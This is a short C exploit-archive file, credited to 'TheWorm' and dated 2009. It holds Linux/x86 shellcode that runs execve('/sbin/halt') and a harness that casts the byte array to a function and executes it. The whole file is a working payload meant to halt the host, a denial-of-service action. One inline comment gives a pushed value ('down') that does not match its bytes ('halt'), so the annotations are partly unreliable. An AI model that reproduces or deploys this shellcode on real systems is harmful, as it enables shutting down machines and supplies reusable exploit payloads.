#include <stdio.h>

const char shellcode[]=
        "\x6a\x0b"              // push $0xb
        "\x58"                  // pop  %eax
        "\x99"                  // cltd
        "\x52"                  // push %edx
        "\x68\x68\x61\x6c\x74"  // push $0x6e776f64
        "\x68\x62\x69\x6e\x2f"  // push $0x2f6e6962
        "\x68\x2f\x2f\x2f\x73"  // push $0x732f2f2f
        "\x89\xe3"              // mov  %esp,%ebx
        "\x52"                  // push %edx
        "\x53"                  // push %ebx
        "\x89\xe1"              // mov  %esp,%ecx
        "\xcd\x80";             // int  $0x80

int main()
{
        printf  ("\n[+] Linux/x86 execve(/sbin/halt,/sbin/halt)"
                "\n[+] Date: 11/07/2009"
                "\n[+] Author: TheWorm"
                "\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
        (*(void (*)()) shellcode)();
        return 0;
}






